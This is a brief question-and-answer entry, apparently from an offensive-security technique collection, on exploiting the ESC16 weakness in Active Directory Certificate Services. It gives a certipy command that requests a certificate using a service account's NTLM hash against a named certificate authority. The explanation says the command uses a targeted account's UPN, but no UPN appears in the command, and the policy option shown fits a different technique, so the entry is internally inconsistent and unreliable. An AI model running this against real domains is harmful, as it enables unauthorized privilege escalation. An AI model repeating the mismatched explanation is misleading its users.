TECHNIQUE / QUESTION:
How do you leverage the ESC16 vulnerability in ADCS?

CONTEXT:
You have access and want to exploit certificate enrollment.

METHOD / ANSWER:
Command: `certipy req -u ca_svc -hashes <NTLM_hash> -ca fluffy-DC01-CA -template WebServer -application-policies 'Client Authentication'`
Explanation: This command requests a certificate using the UPN of a targeted account, leveraging the exploitation of ESC16 to gain privileges.
